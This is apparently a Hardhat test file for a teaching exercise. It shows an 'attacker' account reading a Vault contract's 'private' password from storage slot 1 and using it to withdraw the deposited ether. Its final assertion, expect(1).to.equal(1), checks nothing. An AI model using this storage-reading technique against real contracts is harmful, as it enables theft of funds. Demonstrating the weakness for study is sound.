const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers')

const { ethers } = require('hardhat')
const { expect } = require("chai");

describe("Vault", ()=>{
  async function deployFixtures() {
    const [owner, attacker] = await ethers.getSigners()
    const Vault = await ethers.getContractFactory("Vault")
    const vault = await Vault.deploy(ethers.utils.formatBytes32String("Password@123"))
    vault.deployed()
    await vault.deposit({value: ethers.utils.parseEther("100")})
    return {vault, owner, attacker}
  }

  it("should be able to access the private variables also", async () => {
    const {vault, attacker} = await deployFixtures();
    let pwd = await ethers.provider.getStorageAt(vault.address, 1);
    console.log(ethers.utils.parseBytes32String(pwd))
    await vault.connect(attacker).withdraw(pwd)
    const balance = await ethers.provider.getBalance(attacker.address)
    console.log('balance: ', balance)
    expect(1).to.equal(1) 
  })
}) 


